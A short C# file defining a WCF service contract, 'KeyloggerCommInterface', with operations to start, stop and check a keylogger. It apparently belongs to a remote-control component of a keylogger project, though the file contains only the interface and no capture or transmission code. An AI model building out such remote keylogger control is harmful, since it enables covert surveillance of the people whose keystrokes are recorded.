using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.ServiceModel;

namespace KeyloggerCommunications
{
    [ServiceContract]
    public interface KeyloggerCommInterface
    {
        [OperationContract]
        bool StartKeylogger();

        [OperationContract]
        bool StopKeylogger();

        [OperationContract]
        bool CheckIfRunning();
    }
}